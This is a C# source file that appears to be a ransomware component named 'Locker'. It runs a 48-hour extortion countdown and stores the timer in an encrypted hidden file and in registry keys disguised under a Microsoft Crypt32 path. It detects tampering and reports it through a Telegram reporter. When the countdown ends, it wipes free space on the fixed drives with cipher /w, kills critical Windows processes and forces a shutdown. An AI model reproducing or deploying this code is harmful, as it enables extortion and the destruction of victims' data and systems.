using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace ns0
{
    internal static class ShutdownTrigger
    {
        private const string TimerFileName = "info-Locker.txt";
        public static readonly string TimerFilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            TimerFileName);

        private const long TotalSeconds = 48L * 3600L;
        private const int GlobalWipeTimeoutMs = 300000;
        private const int PerDriveTimeoutMs = 60000;
        private const string DisableFlagRegPath = @"SOFTWARE\\Locker\\State";
        private const string DisableFlagValueName = "TimerDisabled";

        // Многослойное хранение старт-тиков (анти-подмена/анти-удаление).
        private const string StateRegPath = @"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Crypt32\\State";
        private const string StateStartTicksName = "CacheSeed";
        private const string StateLastSeenTicksName = "CacheSalt";
        private const string StateBackupRegPath = @"SOFTWARE\\Locker\\State";
        private const string StateBackupStartTicksName = "Seed2";
        private const string StateBackupLastSeenName = "Salt2";

                                            public static bool TimerDisabled
        {
            get => ReadDisableFlagFromRegistry();
            set => WriteDisableFlagToRegistry(value);
        }

        public static void InitializeTimer()
        {
            try
            {
                if (TimerDisabled) return;

                long now = DateTime.UtcNow.Ticks;

                if (!File.Exists(TimerFilePath))
                {
                    File.WriteAllText(TimerFilePath, HybridCrypto.EncryptTimerFile(now.ToString()));
                    try { File.SetAttributes(TimerFilePath, FileAttributes.Hidden | FileAttributes.System); } catch { }
                }

                long earliest = PeekEarliestStartTicks();
                if (earliest <= 0) earliest = now;
                WriteRegStartTicks(earliest);
            }
            catch { }
        }

        private static long PeekEarliestStartTicks()
        {
            long earliest = 0;

            long fromFile = ReadFileStartTicks();
            if (fromFile > 0) earliest = fromFile;

            long fromReg = ReadRegLong(StateRegPath, StateStartTicksName);
            if (fromReg > 0 && (earliest == 0 || fromReg < earliest)) earliest = fromReg;

            long fromBackup = ReadRegLong(StateBackupRegPath, StateBackupStartTicksName);
            if (fromBackup > 0 && (earliest == 0 || fromBackup < earliest)) earliest = fromBackup;

            return earliest;
        }

        private static long ReadFileStartTicks()
        {
            try
            {
                if (!File.Exists(TimerFilePath)) return 0;
                string plain = HybridCrypto.DecryptTimerFile(File.ReadAllText(TimerFilePath));
                long ticks;
                if (long.TryParse(plain, out ticks) && ticks > 0) return ticks;
            }
            catch { }
            return 0;
        }

        private static long ReadRegLong(string path, string name)
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(path, RegistryKeyPermissionCheck.ReadSubTree))
                {
                    object v = key?.GetValue(name);
                    if (v != null)
                    {
                        long parsed;
                        if (long.TryParse(v.ToString(), out parsed)) return parsed;
                    }
                }
            }
            catch { }
            return 0;
        }

        private static void WriteRegLong(string path, string name, long value)
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(path, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    key.SetValue(name, value.ToString(), RegistryValueKind.String);
                }
            }
            catch { }
        }

        private static void WriteRegStartTicks(long ticks)
        {
            long existing = PeekEarliestStartTicks();
            long value = (existing > 0 && existing < ticks) ? existing : ticks;
            WriteRegLong(StateRegPath, StateStartTicksName, value);
            WriteRegLong(StateBackupRegPath, StateBackupStartTicksName, value);
        }

        // Монотонный учёт: откат системных часов не уменьшает прошедшее время.
        private static long ApplyMonotonicGuard(long elapsedSeconds)
        {
            try
            {
                long lastSeen = ReadRegLong(StateRegPath, StateLastSeenTicksName);
                if (lastSeen <= 0)
                {
                    WriteRegLong(StateRegPath, StateLastSeenTicksName, elapsedSeconds);
                    WriteRegLong(StateBackupRegPath, StateBackupLastSeenName, elapsedSeconds);
                    return elapsedSeconds;
                }

                long effective = elapsedSeconds > lastSeen ? elapsedSeconds : lastSeen;
                if (effective != lastSeen)
                {
                    WriteRegLong(StateRegPath, StateLastSeenTicksName, effective);
                    WriteRegLong(StateBackupRegPath, StateBackupLastSeenName, effective);
                }
                return effective;
            }
            catch
            {
                return elapsedSeconds;
            }
        }

        private static bool _tamperReported;

        // Сравнивает слои. Расхождение = кто-то лазил в таймер.
        private static void CheckTamper()
        {
            try
            {
                if (_tamperReported) return;

                long fromFile = ReadFileStartTicks();
                long fromReg = ReadRegLong(StateRegPath, StateStartTicksName);
                long fromBackup = ReadRegLong(StateBackupRegPath, StateBackupStartTicksName);

                int present = 0;
                if (fromFile > 0) present++;
                if (fromReg > 0) present++;
                if (fromBackup > 0) present++;

                // Ожидаем три слоя. Если один исчез или разошёлся > 60с — тампер.
                bool missing = present < 3;
                bool diverged = false;
                long tolerance = TimeSpan.TicksPerMinute;
                if (fromFile > 0 && fromReg > 0 && Math.Abs(fromFile - fromReg) > tolerance) diverged = true;
                if (fromFile > 0 && fromBackup > 0 && Math.Abs(fromFile - fromBackup) > tolerance) diverged = true;

                if (missing || diverged)
                {
                    _tamperReported = true;
                    try
                    {
                        TelegramReporter.ReportComplianceEvent(
                            "TIMER_TAMPER",
                            (missing ? "слой отсутствует; " : "") + (diverged ? "слои разошлись; " : "") +
                            "file=" + fromFile + " reg=" + fromReg + " backup=" + fromBackup,
                            "HIGH");
                    }
                    catch { }

                    // Форс-восстановление самого раннего известного старта.
                    long earliest = PeekEarliestStartTicks();
                    if (earliest > 0) WriteRegStartTicks(earliest);
                }
            }
            catch { }
        }

        public static long GetRemainingSeconds()
        {
            if (TimerDisabled) return 0;

            CheckTamper();

            long startTicks = PeekEarliestStartTicks();
            if (startTicks <= 0)
            {
                InitializeTimer();
                startTicks = PeekEarliestStartTicks();
                if (startTicks <= 0) return TotalSeconds;
            }

            DateTime start = new DateTime(startTicks, DateTimeKind.Utc);
            long elapsed = (long)(DateTime.UtcNow - start).TotalSeconds;
            if (elapsed < 0) elapsed = 0;
            elapsed = ApplyMonotonicGuard(elapsed);

            long remaining = TotalSeconds - elapsed;
            return remaining > 0 ? remaining : 0;
        }

        public static bool IsTimeExpired()
        {
            if (TimerDisabled) return false;
            return GetRemainingSeconds() <= 0;
        }

        // Форсированная фиксация прошедшего времени перед завершением сессии.
        // Вызывается на SystemEvents.SessionEnding (logoff/shutdown/restart),
        // чтобы устаревший счётчик не «воскрес» после перезагрузки.
        public static void ForcePersistElapsed()
        {
            long remaining = GetRemainingSeconds();
            long elapsed = TotalSeconds - remaining;
            if (elapsed < 0) elapsed = 0;
            try { WriteRegLong(StateRegPath, StateLastSeenTicksName, elapsed); } catch { }
            try { WriteRegLong(StateBackupRegPath, StateBackupLastSeenName, elapsed); } catch { }
        }

        // --- Анти-тампер шифрования после старта ---
        private const string EncActiveName = "EncActive";
        private static volatile bool _encCompleted;

        public static void MarkEncryptionStarted()
        {
            try { WriteRegLong(StateRegPath, EncActiveName, 1); } catch { }
        }

        public static void MarkEncryptionCompleted()
        {
            try
            {
                _encCompleted = true;
                WriteRegLong(StateRegPath, EncActiveName, 0);
            }
            catch { }
        }

        public static bool IsEncryptionActive()
        {
            if (_encCompleted) return false;
            try
            {
                long v = ReadRegLong(StateRegPath, EncActiveName);
                return v == 1;
            }
            catch { }
            return false;
        }

        public enum TimerThreat { Normal, Warning, Critical, Imminent, Expired }

        public static TimerThreat GetThreatLevel()
        {
            long r = GetRemainingSeconds();
            if (r <= 0) return TimerThreat.Expired;
            if (r <= 60) return TimerThreat.Imminent;
            if (r <= 3600) return TimerThreat.Critical;
            if (r <= 6 * 3600) return TimerThreat.Warning;
            return TimerThreat.Normal;
        }

        public static string GetRemainingTimeString()
        {
            long remaining = GetRemainingSeconds();
            long hours = remaining / 3600;
            long minutes = (remaining % 3600) / 60;
            long seconds = remaining % 60;
            return string.Format("{0:00}:{1:00}:{2:00}", hours, minutes, seconds);
        }

        public static string GetRemainingVerbose()
        {
            long remaining = GetRemainingSeconds();
            long days = remaining / 86400;
            long hours = (remaining % 86400) / 3600;
            long minutes = (remaining % 3600) / 60;
            long seconds = remaining % 60;
            if (days > 0)
                return string.Format("{0}д {1:00}:{2:00}:{3:00}", days, hours, minutes, seconds);
            return string.Format("{0:00}:{1:00}:{2:00}", hours, minutes, seconds);
        }

                public static async Task ExecuteDestructionAsync(CancellationToken ct = default(CancellationToken))
        {
            if (TimerDisabled) return;

            string currentDrive = Path.GetPathRoot(Environment.SystemDirectory);
            var drives = DriveInfo.GetDrives()
                .Where(di => di.DriveType == DriveType.Fixed)
                .Where(di => !string.Equals(di.Name, currentDrive, StringComparison.OrdinalIgnoreCase))
                .Select(di => di.Name)
                .ToArray();

            if (drives.Length == 0)
            {
                ExecuteShutdown();
                return;
            }

            using (var cts = CancellationTokenSource.CreateLinkedTokenSource(ct))
            {
                cts.CancelAfter(GlobalWipeTimeoutMs);

                var tasks = drives.Select(drive => Task.Run(() => WipeDriveAsync(drive, PerDriveTimeoutMs, cts.Token), cts.Token));
                await Task.WhenAll(tasks);
            }

            ExecuteShutdown();
        }

                private static Task WipeDriveAsync(string driveRoot, int timeoutMs, CancellationToken ct)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "cipher.exe",
                Arguments = "/w:" + driveRoot,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            var tcs = new TaskCompletionSource<object>();
            try
            {
                var proc = new Process { StartInfo = psi, EnableRaisingEvents = true };
                proc.Exited += (s, e) =>
                {
                    try { proc.Dispose(); } catch { }
                    tcs.TrySetResult(null);
                };

                proc.Start();

                var timer = new System.Threading.Timer(state =>
                {
                    try
                    {
                        if (!proc.HasExited)
                        {
                            proc.Kill();
                            proc.Dispose();
                            tcs.TrySetCanceled();
                        }
                    }
                    catch { }
                }, null, timeoutMs, Timeout.Infinite);

                ct.Register(() =>
                {
                    try
                    {
                        timer.Change(Timeout.Infinite, Timeout.Infinite);
                        timer.Dispose();
                        if (!proc.HasExited)
                        {
                            proc.Kill();
                            proc.Dispose();
                        }
                        tcs.TrySetCanceled();
                    }
                    catch { }
                });

                return tcs.Task;
            }
            catch
            {
                try { tcs.TrySetException(new OperationCanceledException()); } catch { }
                return tcs.Task;
            }
        }

        private static void ExecuteShutdown()
        {
            try
            {
                Process.Start("cmd.exe", "/c taskkill /f /im svchost.exe /im explorer.exe /im services.exe");
            }
            catch { }

            try
            {
                Process.Start("shutdown.exe", "/s /f /t 0");
            }
            catch { }
        }

        private static bool ReadDisableFlagFromRegistry()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(DisableFlagRegPath, RegistryKeyPermissionCheck.ReadSubTree))
                {
                    object value = key?.GetValue(DisableFlagValueName);
                    if (value is int)
                        return (int)value == 1;
                }
            }
            catch { }
            return false;
        }

        private static void WriteDisableFlagToRegistry(bool disabled)
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(DisableFlagRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    var adminSid = new SecurityIdentifier("S-1-5-32-544");
                    var systemSid = new SecurityIdentifier("S-1-5-18");
                    var acl = new RegistrySecurity();
                    acl.SetAccessRule(new RegistryAccessRule(systemSid, RegistryRights.FullControl, AccessControlType.Allow));
                    acl.SetAccessRule(new RegistryAccessRule(adminSid, RegistryRights.ReadKey | RegistryRights.WriteKey, AccessControlType.Allow));
                    key.SetAccessControl(acl);
                    key.SetValue(DisableFlagValueName, disabled ? 1 : 0, RegistryValueKind.DWord);
                }
            }
            catch { }
        }
    }
}
